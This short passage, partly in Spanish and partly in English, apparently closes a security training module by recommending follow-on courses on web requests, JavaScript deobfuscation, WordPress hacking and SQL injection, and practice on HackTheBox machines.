El `Web Requests` y `JavaScript Deobfuscation` Los módulos de la Academia ayudarán a construir sobre el conocimiento presentado en este módulo.

The module `Hacking WordPress` and other similar modules related to `OWASP Top 10` (such as `SQL Injection Fundamentals`) are great next steps to get into penetration testing web applications and learn more about web application vulnerabilities and exploitation. Finally, to apply what we learned from these modules, we can jump into attacking some `Easy` boxes on [HackTheBox](https://www.hackthebox.eu/).